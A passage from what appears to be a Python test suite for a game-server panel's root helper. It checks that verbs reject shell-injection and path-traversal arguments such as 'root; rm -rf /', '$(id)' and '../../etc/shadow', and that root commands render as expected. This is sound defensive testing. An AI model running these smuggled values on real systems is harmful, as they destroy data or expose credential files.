    "ufw-allow-iface": ["eth0; id", "../../etc", "a" * 16, "$(id)"],
    "ufw-delete-allow-app": ["OpenSSH; id", "Nginx", "openssh"],
    "ufw-default": ["allow; id", "drop"],
    "ufw-delete-num": ["0", "1; id", "-1", "abc"],
    # The unit list is exhaustive on purpose: the panel may restart these six services and nothing
    # else, so a real service name it was never meant to touch is refused like an injection is.
    "service-restart": ["nginx", "docker", "ssh; id", "ssh.service", ""],
    # The delay is the ONLY caller input to a verb that restarts the panel itself.
    "panel-restart": ["0", "301", "-1", "2; reboot", "", "abc", "1e3"],
    # These two are exported into a ROOT-run installer's environment.
    "panel-self-update": ["--upload-pack=x", "main; id", "a/../b", "HEAD~1", "'"],
    # The operator is a Linux user name; anything shaped like a flag or a shell fragment is out.
    "tailscale-set-operator": ["root; id", "--operator=x", "", "a" * 40, "has space"],
    "f2b-status-jail": ["sshd; id", "$(id)", "a" * 65, ""],
    # Package names reach `apt-get install` as separate argv entries, but a name is still the one
    # place an attacker-supplied string gets to be a whole argument — so it is charset-checked.
    "apt-install": ["curl; id", "$(id)", "--reinstall", "-o", "Curl", "pkg name", ""],
    "dpkg-add-arch": ["amd64", "i386; id", ""],
    "apt-add-repo": ["ppa:someone/ppa", "universe; id", "multiverse"],
    "apt-full-upgrade": ["phased; id", "everything", ""],
    # The log verbs take a SOURCE NAME, never a path or a unit — so a traversal is not rejected by
    # a filter, it is simply not expressible.
    "log-tail": ["/etc/shadow", "../../etc/shadow", "syslog", "auth; id", ""],
    "journal": ["nginx", "ssh; id", "linuxgsm-panel", ""],
    # user-remove-home runs `rm -rf` as root. These are the names that must never become a path.
    "user-remove-home": ["..", ".", "", "-rf", "/home/x", "root; rm -rf /", "a" * 33, "1abc"],
    "user-create": ["-o root", "a b", "$(id)", ""],
    # write-file takes a destination NAME. A path is not "escaped" here, it is not accepted.
    "write-file": ["/etc/shadow", "/etc/passwd", "../../etc/shadow", "fail2ban-jail-local; id", ""],
    "sysctl-reload": ["../../etc", "tailscale; id", ""],
    "f2b-set-sshd-ports": ["22; id", "0", "99999", "a,b", "", "1,2,3,4,5,6,7,8,9,10,11"],
    "set-timezone": ["../../etc/passwd", "UTC; id", "$(id)", "", "A" * 40],
    "disk-free": ["relative", "/home/../etc", "/home; id", "", "/home/$(id)"],
    "pro-attach": ["short", "tok en", "tok;id", ""],
    "renice-users": ["-99", "20", "abc", ""],
}
_leaked = []
for _v, _bads in _BAD.items():
    _nargs = len(_VERB_SAMPLES[_v])
    for _b in _bads:
        _args = [_b] + ["x"] * (_nargs - 1) if _nargs else [_b]
        try:
            _priv.check_args(_v, _args[:_nargs] if _nargs else [])
            _leaked.append("%s <- %r" % (_v, _b))
        except _priv.VerbError:
            pass
check("privileged: injection and out-of-range arguments are refused, not quoted",
      not _leaked, "; ".join(_leaked[:3]))

# _BAD above only ever puts the bad value in argument ONE, which silently leaves later arguments
# untested: widening PRO_SERVICES to accept any string passed the whole suite, because
# pro-service's first argument is the action and its own _choice rejected the probe first. These
# are full argument vectors, so a validator in any position is actually exercised.
_BAD_VECTORS = [
    ("pro-service", ["enable", "nginx"]),
    ("pro-service", ["enable", "esm-infra; id"]),
    ("pro-service", ["enable", ""]),
    ("pro-service", ["restart", "esm-infra"]),
    # The download verbs' path is argument TWO, and it is the only caller-chosen path in the whole
    # table that is not built from an identifier — so every shape that could leave the game user's
    # home, or split a line for something reading the value later, is probed here.
    ("game-file-read", ["codserver", ""]),
    ("game-file-read", ["codserver", "/etc/passwd"]),
    ("game-file-read", ["codserver", "../../etc/passwd"]),
    ("game-file-read", ["codserver", "cfg/../../../etc/passwd"]),
    ("game-file-read", ["codserver", ".."]),
    ("game-file-read", ["codserver", "cfg/x\nX: 1"]),
    ("game-file-read", ["codserver", "cfg/x\x00.cfg"]),
    ("game-file-read", ["codserver", "a" * 1025]),
    ("game-dir-tar", ["codserver", ""]),
    ("game-dir-tar", ["codserver", "../.ssh"]),
    ("game-dir-tar", ["codserver", "/root"]),
    ("renice-users", ["-1", "root; id"]),
    ("renice-users", ["-1", "-oProxyCommand=x"]),
    ("renice-users", ["-1", "codserver", "bad;user"]),
    ("ufw-allow-port", ["27015", "comment; id"]),
    ("ufw-deny-ip", ["203.0.113.5", "tag$(id)"]),
    ("f2b-unban", ["sshd", "not-an-ip"]),
    ("ufw-allow-proto-port", ["tcp", "22", "a;b"]),
    ("ufw-default", ["allow", "sideways"]),
    ("apt-install", ["curl", "--reinstall"]),
    ("write-file", ["/etc/shadow"]),
    # The backup NAME is argument two, so _BAD above never reaches it — it pads position two
    # with "x". These aim at the validator that actually guards the path segment.
    ("game-backup-read", ["ubuntu", "../../etc/shadow"]),
    ("game-backup-read", ["ubuntu", "a/b.tar.gz"]),
    ("game-backup-read", ["ubuntu", "x.tar.gz; id"]),
    ("game-backup-read", ["ubuntu", "plain.txt"]),
    ("game-backup-read", ["ubuntu", ""]),
    ("panel-self-update", ["-", "main; id"]),
    ("panel-self-update", ["-", "--upload-pack=x"]),
    ("panel-self-update", ["-", "a/../b"]),
    ("panel-self-update", ["nothex", "-"]),
    # The content box: three of these verbs end in `rm -rf` as root, so the identifiers must be
    # refused in every position, not just the first.
    ("content-game-remove", ["gmodcontent", "../../etc", "cssserver"]),
    ("content-game-remove", ["gmodcontent", "cstrike", "../../etc"]),
    ("content-game-remove", ["..", "cstrike", "cssserver"]),
    ("content-game-remove", ["gmodcontent", "", "cssserver"]),
    ("content-game-present", ["gmodcontent", "a;b"]),
    ("content-grant-read", ["gmodcontent", "root; id", "gmodserver", "cstrike"]),
    ("content-grant-read", ["gmodcontent", "gmodcontent", "gmodserver", "../../etc"]),
    ("gmod-mount-read", ["../../etc"]),
    ("content-cron-remove", [".."]),
    ("content-scan", ["../../etc"]),
    ("content-scan", ["a;b"]),
    ("content-scan", [""]),
    ("f2b-log-lines", ["2026-09-02; id"]),
    ("f2b-log-lines", ["$(id)"]),
    ("f2b-log-lines", [""]),
    ("f2b-log-lines", ["/var/log/anything"]),
    # sshd-set-directive is the one verb where an argument constrains another: the panel may set
    # four directives, each only to values from its OWN set. "PermitRootLogin yes" is individually
    # well-formed and must still be refused.
    ("sshd-set-directive", ["Banner", "x"]),
    ("sshd-set-directive", ["PermitRootLogin", "yes"]),
    ("sshd-set-directive", ["ClientAliveInterval", "0"]),
    ("sshd-set-directive", ["PasswordAuthentication", "maybe"]),
    ("sshd-set-directive", ["ClientAliveInterval", "300; id"]),
    ("npm-install-global", ["evil-package"]),
    # tailscale: routes are PARSED as networks and tags must be `tag:name`, so a shell
    # metacharacter in either is refused rather than quoted.
    ("tailscale-up-key", ["tskey-abc123def45", "yes", "1.2.3.0/24; reboot", "-"]),
    ("tailscale-up-key", ["tskey-abc123def45", "yes", "-", "tag:x; rm -rf /"]),
    ("tailscale-up-key", ["tskey; touch /tmp/x", "yes", "-", "-"]),
    ("tailscale-up-key", ["tskey-abc123def45", "maybe", "-", "-"]),
    ("tailscale-up-key", ["short", "yes", "-", "-"]),
    ("tailscale-up-login", ["yes", "notacidr"]),
    ("tailscale-up-login", ["sure", "-"]),
]
_leaked2 = ["%s %r" % (v, a) for v, a in _BAD_VECTORS
            if not _ufw_raises_verb(lambda v=v, a=a: _priv.check_args(v, a))]
check("privileged: a bad argument is refused wherever it sits in the vector, not just first",
      not _leaked2, "; ".join(_leaked2[:3]))

# Arguments stay ARGUMENTS. The local transport never produces a string for a shell to parse, so a
# metacharacter is inert rather than escaped-and-hoped-for.
_argv = _priv.helper_argv("ufw-allow-port", ["27015", "cod server"])
check("privileged: local transport passes argv, with the comment as ONE element",
      "cod server" in _argv and not any(" -c" == x for x in _argv), repr(_argv))
check("privileged: local transport invokes the helper, never a shell",
      _argv[:3] == ["sudo", "-n", _priv.HELPER_PATH] and "bash" not in " ".join(_argv), repr(_argv))

# The remote transport must keep sending what it always sent — a host upgrading to this code should
# not see its firewall commands change shape.
_REMOTE_EXPECTED = {
    ("ufw-status", ("numbered",)): "ufw status numbered 2>&1",
    ("ufw-status", ("plain",)): "ufw status 2>&1",
    ("ufw-enable", ()): "ufw --force enable 2>&1",
    ("ufw-default", ("deny", "incoming")): "ufw default deny incoming 2>&1",
    ("ufw-allow-port", ("27015", "Game")): "ufw allow 27015 comment Game 2>&1",
    ("ufw-allow-proto-port", ("tcp", "27015", "")): "ufw allow proto tcp to any port 27015 2>&1",
    ("ufw-limit-port", ("22/tcp",)): "ufw limit 22/tcp 2>&1",
    ("ufw-allow-iface", ("tailscale0",)): "ufw allow in on tailscale0 2>&1",
    ("ufw-delete-num", ("3",)): "yes | ufw delete 3 2>&1",
    ("ufw-deny-ip", ("203.0.113.5", "panel-autoblock")):
        "ufw insert 1 deny from 203.0.113.5 comment panel-autoblock 2>&1",
    ("f2b-status", ()): "fail2ban-client status 2>&1",
    ("f2b-status-jail", ("sshd",)): "fail2ban-client status sshd 2>&1",
    ("f2b-unban", ("sshd", "203.0.113.5")): "fail2ban-client set sshd unbanip 203.0.113.5 2>&1",
    ("f2b-reload", ()): "fail2ban-client reload 2>&1",
    ("service-restart", ("ssh",)): "systemctl restart ssh 2>&1",
    ("service-enable-now", ("fail2ban",)): "systemctl enable --now fail2ban 2>&1",
    ("service-disable-now", ("cups",)): "systemctl disable --now cups 2>&1",
    ("apt-update", ()): "apt-get update -qq 2>&1",
    ("apt-autoremove", ()): "apt-get autoremove -y 2>&1",
    ("apt-install", ("curl",)):
        "DEBIAN_FRONTEND=noninteractive apt-get install -y curl 2>&1",
    ("apt-install", ("python3", "libsdl2-2.0-0:i386")):
        "DEBIAN_FRONTEND=noninteractive apt-get install -y python3 libsdl2-2.0-0:i386 2>&1",
    ("apt-full-upgrade", ("phased",)):
        "DEBIAN_FRONTEND=noninteractive apt-get full-upgrade -y "
        "-o APT::Get::Always-Include-Phased-Updates=true "
        "-o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold 2>&1",
    ("apt-full-upgrade", ("standard",)):
        "DEBIAN_FRONTEND=noninteractive apt-get full-upgrade -y "
        "-o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold 2>&1",
    ("dpkg-add-arch", ("i386",)): "dpkg --add-architecture i386 2>&1",
    ("apt-add-repo", ("universe",)): "add-apt-repository -y universe 2>&1",
    ("apt-upgrade-running", ()):
        "pgrep -f 'apt-get (upgrade|dist-upgrade|full-upgrade)' 2>&1",
    ("reboot", ()): "reboot 2>&1",
    ("journal", ("ssh", "400")): "journalctl -u ssh -u sshd --no-pager -n 400 2>&1",
    ("journal", ("fail2ban", "4000")): "journalctl -u fail2ban --no-pager -n 4000 2>&1",
    ("journal", ("panel", "400")): "journalctl -u linuxgsm-panel --no-pager -n 400 2>&1",
    ("log-tail", ("fail2ban", "4000")): "tail -n 4000 /var/log/fail2ban.log 2>&1",
    ("log-tail", ("auth", "200")): "tail -n 200 /var/log/auth.log 2>&1",
    ("os-update-log", ()): "tail -c 20000 /run/panel-os-update.log 2>&1",
    ("journal-cron", ()):
        "journalctl _COMM=cron --since '-14 days' -o short-unix --no-pager 2>&1",
    ("content-game-remove", ("gmodcontent", "cstrike", "cssserver")):
        "rm -rf /home/gmodcontent/serverfiles/cstrike ; rm -rf /home/gmodcontent/cssserver"
        " ; rm -rf /home/gmodcontent/lgsm/config-lgsm/cssserver",
    ("content-game-remove", ("srcds", "hl2", "-")): "rm -rf /home/srcds/serverfiles/hl2",
    ("content-cron-remove", ("gmodcontent",)):
        "rm -f /etc/cron.d/lgsm-gmod-content-gmodcontent",
    ("gmod-mount-read", ("gmodserver",)):
        "cat /home/gmodserver/serverfiles/garrysmod/cfg/mount.cfg 2>/dev/null || true",
    ("crontab-list", ("codserver",)): "crontab -u codserver -l 2>&1",
    ("user-create", ("codserver",)): "useradd -m -s /bin/bash codserver 2>&1",
    ("user-lock-password", ("codserver",)): "passwd -l codserver 2>&1",
    ("user-delete-force", ("codserver",)): "userdel -r -f codserver 2>&1",
    ("user-kill-processes", ("codserver",)): "pkill -9 -u codserver 2>&1",
    ("user-remove-home", ("codserver",)): "rm -rf -- /home/codserver 2>&1",
}
_wrong = []
for (_v, _a), _want in _REMOTE_EXPECTED.items():
    _got = _priv.remote_command(_v, list(_a))
    if _got != _want:
        _wrong.append("%s: %r != %r" % (_v, _got, _want))
check("privileged: the remote transport renders the same commands the SSH path always sent",
      not _wrong, "; ".join(_wrong[:2]))

# A comment with a space must survive shell-quoting on the remote side.
check("privileged: remote rendering quotes a comment containing a space",
      _priv.remote_command("ufw-allow-port", ["27015", "cod server"])
      == "ufw allow 27015 comment 'cod server' 2>&1",
      _priv.remote_command("ufw-allow-port", ["27015", "cod server"]))

# End-to-end through the real script: unknown verbs and wrong arity are refused before anything runs.
_hp = _sp.run([sys.executable, _helper_path, "definitely-not-a-verb"],
              capture_output=True, text=True, timeout=60)
check("helper: an unknown verb exits 2 and runs nothing", _hp.returncode == 2, _hp.stderr.strip()[:80])
_hp = _sp.run([sys.executable, _helper_path, "ufw-status", "numbered", "extra"],
              capture_output=True, text=True, timeout=60)
check("helper: the wrong number of arguments exits 2", _hp.returncode == 2, _hp.stderr.strip()[:80])
_hp = _sp.run([sys.executable, _helper_path, "ufw-deny-ip", "1.2.3.4; id", "tag"],
              capture_output=True, text=True, timeout=60)
check("helper: a rejected argument exits 2", _hp.returncode == 2, _hp.stderr.strip()[:80])
check("helper: the rejected value is NOT echoed back (this runs as root, its stderr reaches the UI)",
      "1.2.3.4; id" not in _hp.stderr, _hp.stderr.strip()[:100])

# apt-install is the one variadic verb: a package LIST, each element validated, with a floor and a
# ceiling on how many. An unbounded list would be a way to make one command arbitrarily large.
check("privileged: apt-install accepts a list of packages",
      _priv.tool_argv("apt-install", ["a", "b-c", "d:i386"])[-3:] == ["a", "b-c", "d:i386"])
check("privileged: apt-install refuses an empty package list",
      _ufw_raises_verb(lambda: _priv.check_args("apt-install", [])))
check("privileged: apt-install refuses an absurdly long package list",
      _ufw_raises_verb(lambda: _priv.check_args("apt-install", ["pkg"] * 65)))
check("privileged: one bad name rejects the whole apt-install list",
      _ufw_raises_verb(lambda: _priv.check_args("apt-install", ["good", "also-good", "bad;name"])))

# The write verb: content goes on stdin and the destination is a name, so neither ever becomes
# part of a command line. The two copies of the table must agree on every path AND every mode — a
# world-writable /etc/fail2ban/jail.local would be a quiet disaster.
check("privileged: the two copies agree on every write target, path and mode",
      _priv.WRITE_TARGETS == _helper.WRITE_TARGETS)
check("privileged: every write target is an absolute path under /etc",
      all(p.startswith("/etc/") and ".." not in p for p, _m in _priv.WRITE_TARGETS.values()),
      str(sorted(p for p, _m in _priv.WRITE_TARGETS.values()))[:120])
check("privileged: no write target is group- or world-writable",
      all(m & 0o022 == 0 for _p, m in _priv.WRITE_TARGETS.values()),
      str({p: oct(m) for p, m in _priv.WRITE_TARGETS.values()})[:120])
# This gate used to assert the sshd drop-in was ABSENT, so that adding it could not happen by
# accident in a batch. It is present now, deliberately, together with the backup / validate /
# restore verbs that make changing it survivable. What is checked has moved accordingly: the
# drop-in may be written only if every step of the rollback sequence exists as a verb.
_SSHD_SEQUENCE = ["sshd-backup-dropin", "sshd-validate", "sshd-restore-dropin",
                  "sshd-discard-backup"]
check("privileged: the sshd drop-in is writable only alongside its whole rollback sequence",
      ("sshd-port-dropin" in _priv.WRITE_TARGETS)
      <= all(v in _priv.verbs() for v in _SSHD_SEQUENCE),
      "missing: %s" % [v for v in _SSHD_SEQUENCE if v not in _priv.verbs()])
check("privileged: the sshd snapshot cannot be read back by sshd (it must not end in .conf)",
      not _priv.SSHD_DROPIN_BAK.endswith(".conf") and _priv.SSHD_DROPIN.endswith(".conf"),
      _priv.SSHD_DROPIN_BAK)
check("privileged: both copies agree on the sshd paths",
      (_priv.SSHD_DROPIN, _priv.SSHD_DROPIN_BAK)
      == (_helper.SSHD_DROPIN, _helper.SSHD_DROPIN_BAK))
check("privileged: both copies agree on fail2ban's jail.local path",
      _priv.F2B_JAIL_LOCAL == _helper.F2B_JAIL_LOCAL)
# The tailscale login log is read by a poll loop running as root. Both copies must name the same
# file, and it must live in /run: in /tmp any local user could pre-create or replace it, and the
# poll would then be reading a file it does not own.
check("privileged: both copies agree on the tailscale login log",
      _priv.TS_UP_LOG == _helper.TS_UP_LOG, "%s / %s" % (_priv.TS_UP_LOG, _helper.TS_UP_LOG))
check("privileged: the tailscale login log is in /run, not /tmp",
      _priv.TS_UP_LOG.startswith("/run/"), _priv.TS_UP_LOG)
# Every time a verb takes over an operation, the module-level constant that used to hold its path
# or its command is left behind with no users — and CodeQL's py/unused-global-variable turns main
# RED for it through the open-alerts gate from #101. That has now happened four times.
#
# The gate that used to be here named two constants explicitly, which is why it caught neither of
# the next two. This finds them by structure instead: every module-level `NAME = …`, checked
# against every Name/Attribute reference across the panel, its tools and its tests.
#
# Assignments whose value is a CALL are skipped, and that carve-out is load-bearing:
# `group_permissions = db.Table("group_permissions", …)` is referenced nowhere by name, but the
# call registers the table in SQLAlchemy's metadata, so create_all() builds it. Deleting it as
# "unused" would drop a table from the schema.
import ast as _ast_scan
# DERIVED, not hardcoded. This list used to name all fifteen modules by hand, which meant a new
# panel module was silently exempt from the gate until someone remembered to add it — and the
# whole point of a structural check is that it covers what actually exists. Splitting app.py up
# creates modules steadily, so the list reads the tree instead.
#
# It reads the root AND panel/: most modules moved into the package, while app.py, manage.py and
# db_maintenance.py stay at the root because the systemd unit, recover.sh and the installer each
# address them by path. A root-only listdir would now cover three modules and exempt eighteen —
# which is why the assert below names one of each and is deliberately load-bearing.
_SCAN_MODULES = sorted(
    [f for f in os.listdir(_root)
     if f.endswith(".py") and not f.startswith((".", "_")) and f != "setup.py"]
    # `not f.startswith("__")`, not `"_"`: panel/routes/_shared.py is ordinary private code and
    # holds the helpers the split made cross-module. Skipping it exempted every constant only it
    # uses, which is how _cmd_fetch_attempts and _pubip_resolve_attempts read as orphans.
    + [os.path.relpath(os.path.join(_dp, f), _root)
       for _dp, _dn, _fs in os.walk(os.path.join(_root, "panel"))
       if "__pycache__" not in _dp
       for f in _fs if f.endswith(".py") and not f.startswith("__")]
)
assert "app.py" in _SCAN_MODULES and os.path.join("panel", "ops", "ssh_manager", "_core.py") in _SCAN_MODULES, \
    "module discovery is looking at the wrong directory: %s" % _SCAN_MODULES[:5]
# The two lists are kept APART on purpose, and which one the orphan check consults is the whole
# point. _OS_UPDATE_LOG survived this gate all the way onto main and turned the branch red via
# CodeQL alert #352: it was dead production code, but a test asserted it equalled the helper's
# copy, and a test reference used to count as "referenced". A constant that only its own test
# mentions is exactly the thing this gate exists to find, so the orphan check below reads
# production references only. Tests are still parsed — other checks walk _parsed — they just
# no longer vouch for a name's aliveness.
_SCAN_PROD_USERS = _SCAN_MODULES + ["tools/panel-helper", "tools/perf_bench.py",
                                    "tools/lhci_serve.py"]
_SCAN_TEST_USERS = ["tests/unit_test.py", "tests/smoke_test.py", "tests/rbac_test.py",
                    "tests/manage_test.py", "tests/template_actions_test.py"]
_SCAN_USERS = _SCAN_PROD_USERS + _SCAN_TEST_USERS
_referenced = set()
_referenced_prod = set()
_parsed = {}
for _f in _SCAN_USERS:
    _fp = os.path.join(_root, _f)
    if not os.path.exists(_fp):
        continue
    _parsed[_f] = _ast_scan.parse(open(_fp, encoding="utf-8").read())
    _here = set()
    for _n in _ast_scan.walk(_parsed[_f]):
        if isinstance(_n, _ast_scan.Name) and isinstance(_n.ctx, _ast_scan.Load):
            _here.add(_n.id)
        elif isinstance(_n, _ast_scan.Attribute):
            _here.add(_n.attr)                     # sm._FOO / _priv.BAR
        elif isinstance(_n, _ast_scan.ImportFrom):
            for _a in _n.names:
                _here.add(_a.name)
    _referenced |= _here
    if _f in _SCAN_PROD_USERS:
        _referenced_prod |= _here
_orphans = []
for _f in _SCAN_MODULES:
    if _f not in _parsed:
        continue
    for _node in _parsed[_f].body:
        if not isinstance(_node, _ast_scan.Assign) or isinstance(_node.value, _ast_scan.Call):
            continue
        for _t in _node.targets:
            if isinstance(_t, _ast_scan.Name) and not _t.id.startswith("__") \
                    and _t.id not in _referenced_prod:
                _orphans.append("%s:%d %s%s" % (
                    _f, _node.lineno, _t.id,
                    " (only its tests mention it)" if _t.id in _referenced else ""))
# ── Census: argv of the form ["sudo", <shell>, ...] ────────────────────────────────────────────
# This is the measure of how far the sudoers grant is from being narrowable. A sudoers rule that
# permits /bin/bash or /bin/sh is EXACTLY equivalent to NOPASSWD:ALL — the caller just runs
# `sudo bash -c '<anything>'` — so every one of these sites has to become a verb before the grant
# can shrink to the helper alone. install.sh's header says the same thing.
#
# A ratchet, like the sudo=True one: it may fall, never rise. Lower the ceiling when you convert
# one; do not raise it to make a new call site pass.
_SHELLS = {"bash", "sh", "/bin/bash", "/bin/sh"}
_sudo_shell = []
for _f in _SCAN_MODULES:
    _fp = os.path.join(_root, _f)
    if not os.path.exists(_fp):
        continue
    for _n in _ast_scan.walk(_ast_scan.parse(open(_fp, encoding="utf-8").read())):
        if isinstance(_n, (_ast_scan.List, _ast_scan.Tuple)) and _n.elts:
            _first = _n.elts[0]
            if isinstance(_first, _ast_scan.Constant) and _first.value == "sudo":
                _rest = [_e.value for _e in _n.elts[1:3] if isinstance(_e, _ast_scan.Constant)]
                if any(_r in _SHELLS for _r in _rest):
                    _sudo_shell.append("%s:%d" % (_f, _n.lineno))
_SUDO_SHELL_CEILING = 1   # tailscale_integration.install_tailscale_local — the curl|sh installer
check("escalation census: ['sudo', <shell>] sites <= %d (currently %d) — ratchet, never raise"
      % (_SUDO_SHELL_CEILING, len(_sudo_shell)),
      len(_sudo_shell) <= _SUDO_SHELL_CEILING, "; ".join(sorted(_sudo_shell)))

# ── Census: EVERY direct ["sudo", ...] argv that is not the helper ─────────────────────────────
# This is the number that decides whether /etc/sudoers.d/linuxgsm-panel can shrink to a single
# line permitting only panel-helper. While any of these exist the grant has to stay NOPASSWD:ALL,
# because each one runs something the sudoers file would have to permit separately — and the two
# worst (a shell, and systemd-run, which runs whatever you hand it) cannot be scoped at all.
#
# Ratchet: convert a site to a verb and lower the ceiling. Never raise it.
_direct_sudo = []
for _f in _SCAN_MODULES:
    _fp = os.path.join(_root, _f)
    if not os.path.exists(_fp):
        continue
    for _n in _ast_scan.walk(_ast_scan.parse(open(_fp, encoding="utf-8").read())):
        if isinstance(_n, (_ast_scan.List, _ast_scan.Tuple)) and _n.elts:
            _e0 = _n.elts[0]
            if not (isinstance(_e0, _ast_scan.Constant) and _e0.value == "sudo"):
                continue
            # privileged.helper_argv builds ["sudo", "-n", HELPER_PATH, verb, ...] — that IS the
            # boundary, not a bypass of it.
            _second = _n.elts[1] if len(_n.elts) > 1 else None
            if isinstance(_second, _ast_scan.Constant) and _second.value == "-n":
                continue
            _direct_sudo.append("%s:%d" % (_f, _n.lineno))
_DIRECT_SUDO_CEILING = 5   # backup restore, sudo -u cat, self-update, db repair, ts curl|sh installer
check("escalation census: direct ['sudo', ...] sites (not the helper) <= %d (currently %d)"
      % (_DIRECT_SUDO_CEILING, len(_direct_sudo)),
      len(_direct_sudo) <= _DIRECT_SUDO_CEILING, "; ".join(sorted(_direct_sudo)))

# ── panel_state's one rule: mutate in place, never rebind ──────────────────────────────────────
# monitoring.py and app.py both do `from panel_state import _player_counts`, which binds the OBJECT.
# Mutating it (`.clear()`, `[k] = v`) is seen by every importer; REBINDING it (`_player_counts = {}`)
# gives the rebinding module a private copy and strands everyone else on the old one — silently, with
# no error, and the symptom shows up as a monitor that reads stale state. That exact break happened
# while splitting monitoring out: a test reset `_monitor_state` by assignment and the monitor kept
# reading the pre-reset dict. A docstring did not prevent it; this does.
_ps_src = _modsrc("panel_state")
# Dunders are module machinery, not shared state: panel_state declares __all__, and so does
# monitoring — without this exclusion the gate reads monitoring's own __all__ as a rebind of
# panel_state's. (It did, the first time.)
_PS_NAMES = {_t.id for _n in _ast_scan.parse(_ps_src).body if isinstance(_n, _ast_scan.Assign)
             for _t in _n.targets
             if isinstance(_t, _ast_scan.Name) and not _t.id.startswith("__")}
_rebinds = []
for _f in ["app.py", "monitoring.py"] + [f for f in _SCAN_TEST_USERS]:
    # _modpath for the panel modules (they live under panel/ now), plain join for the
    # tests/ paths. No exists() skip: a name that resolves to nothing must raise, not pass.
    _fps = [os.path.join(_root, _f)] if _f.startswith("tests/") else _modfiles(_f)
    for _node in _ast_scan.walk(_ast_scan.parse(
            "\n".join(open(_p, encoding="utf-8").read() for _p in _fps))):
        # `x = ...` and `x, y = ...` rebind; `x.attr = ...` and `x[k] = ...` do not.
        if isinstance(_node, _ast_scan.Assign):
            for _t in _node.targets:
                _flat = _t.elts if isinstance(_t, (_ast_scan.Tuple, _ast_scan.List)) else [_t]
                for _e in _flat:
                    if isinstance(_e, _ast_scan.Name) and _e.id in _PS_NAMES:
                        _rebinds.append("%s:%d %s" % (_f, _e.lineno, _e.id))
                    elif isinstance(_e, _ast_scan.Attribute) and _e.attr in _PS_NAMES:
                        _rebinds.append("%s:%d <mod>.%s" % (_f, _e.lineno, _e.attr))
check("panel_state names are mutated in place, never rebound by an importer",
      not _rebinds, "; ".join(sorted(set(_rebinds))[:5]))

# ── Row-keyed state is pruned when its row is deleted ─────────────────────────────────────────
# SQLite hands a deleted row's id straight to the next INSERT, so a map keyed by row id must forget
# a deleted id or the NEXT server to take that id inherits it. _forget_deleted_rows used to name
# every map by hand, which made each new one an edit somebody had to remember somewhere else — and
# two were missed for as long as they existed (_game_backup_status and the GMod content-apply
# state, both read to RENDER a server's page). They register at their declaration now, so this
# asserts the REGISTRY is what gets pruned rather than re-listing the same names the code lists.
from panel.core import panel_state as _ps_reg
from panel.services.monitoring import _forget_deleted_rows as _fdr
import panel.routes.server_files as _sf_reg   # noqa: F401 - imported so its map registers
_reg_maps = _ps_reg.server_keyed_state() + _ps_reg.remote_keyed_state()
check("panel_state: every row-keyed map is registered for pruning (>= 15)", len(_reg_maps) >= 15,
      "only %d registered" % len(_reg_maps))
_saved = [dict(_m) for _m in _reg_maps]
for _m in _reg_maps:
    _m[1] = "live"
    _m[99] = "left behind by a deleted row"
_fdr(remote_ids={1}, server_ids={1})
check("state pruning: no registered map keeps a deleted row's id",
      not [1 for _m in _reg_maps if 99 in _m],
      "%d map(s) still hold id 99" % len([1 for _m in _reg_maps if 99 in _m]))
check("state pruning: a LIVE id is untouched (it does not just clear everything)",
      all(1 in _m for _m in _reg_maps))
check("state pruning: the two maps that were missed are registered",
      any(_m is _ps_reg._game_backup_status for _m in _ps_reg.server_keyed_state())
      and any(_m is _sf_reg._gmod_content_apply_state for _m in _ps_reg.server_keyed_state()))
# ...and the two JOB registries, which were the next ones missed. Both are keyed by a row id and
# both outlive the row: delete_remote bulk-deletes a host's game servers with no check for an
# install in flight, so a finished install job answers /install-status for whatever server SQLite
# next hands that id, and a "running" leftover makes uninstall_server refuse the new server as
# "still installing". _bootstrap_jobs is worse-behaved still — _begin_bootstrap reads it to decide
# whether to refuse, so a stranded entry blocks the NEW host's bootstrap outright.
import panel.routes._shared as _sh_reg   # noqa: F401 - imported so its map registers
check("state pruning: the install-job registry is pruned with the rest",
      any(_m is _ps_reg._install_jobs for _m in _ps_reg.server_keyed_state()))
check("state pruning: the VPS-bootstrap job registry is pruned with the rest",
      any(_m is _sh_reg._bootstrap_jobs for _m in _ps_reg.remote_keyed_state()))
# A map registered WITH a lock must be pruned holding it — the sweep runs on the monitor thread
# while request handlers write these under the same lock. Assert the registry carries the lock,
# since the pruning loop above cannot show which arm it took.
_locked = {id(_m): _lk for _e in _ps_reg.keyed_state_with_locks() for _m, _lk in _e}
check("state pruning: the job registries are registered WITH their locks",
      _locked.get(id(_ps_reg._install_jobs)) is _ps_reg._install_lock
      and _locked.get(id(_sh_reg._bootstrap_jobs)) is _sh_reg._bootstrap_lock,
      "install=%r bootstrap=%r" % (_locked.get(id(_ps_reg._install_jobs)),
                                   _locked.get(id(_sh_reg._bootstrap_jobs))))
check("state pruning: reboot-when-empty went through the registry too, lock and all",
      _locked.get(id(_ps_reg._reboot_when_empty)) is _ps_reg._rwe_lock)
# ── The per-remote caches inside ssh_manager ──────────────────────────────────────────────────
# Same problem, a different mechanism: this package memoises per HOST, keyed by RemoteServer.id,
# and closes it with an after_delete listener rather than the monitor's sweep (game.py's version
# cache has done that for a while, and says why). Three were left out of it — one of them with no
# expiry at all, so a recycled id reported the deleted machine's hardware until the next restart.
from panel.ops.ssh_manager import _core as _rc_core
from panel.ops.ssh_manager import firewall as _rc_fw
from panel.ops.ssh_manager import hosts as _rc_hosts
check("ssh_manager: the host-specs cache is registered for per-remote invalidation",
      any(_m is _rc_fw._specs_cache for _m in _rc_core._remote_caches))
check("ssh_manager: the Ubuntu Pro status cache is registered",
      any(_m is _rc_hosts._pro_status_cache for _m in _rc_core._remote_caches))
check("ssh_manager: the gamedig-host cache is registered",
      any(_m is _rc_core._gamedig_host_cache for _m in _rc_core._remote_caches))
# ...and forgetting really empties them. _specs_cache is the one that matters most: it has no TTL,
# so nothing else would ever evict a deleted host's entry.
for _m in (_rc_fw._specs_cache, _rc_hosts._pro_status_cache, _rc_core._gamedig_host_cache):
    _m[4242] = "left behind by a deleted host"
_rc_core.forget_remote_caches(4242)
check("ssh_manager: forgetting a deleted host clears every registered per-remote cache",
      not [1 for _m in _rc_core._remote_caches if 4242 in _m],
      "%d cache(s) still hold it" % len([1 for _m in _rc_core._remote_caches if 4242 in _m]))
for _m, _orig in zip(_reg_maps, _saved):          # leave the process state as we found it
    _m.clear()
    _m.update(_orig)

check("no module-level constant is defined and then never referenced by production code",
      not _orphans, "; ".join(_orphans[:4]))
# The remote transport still base64s the content through a shell, so the content must survive
# every byte a config file can legitimately contain.
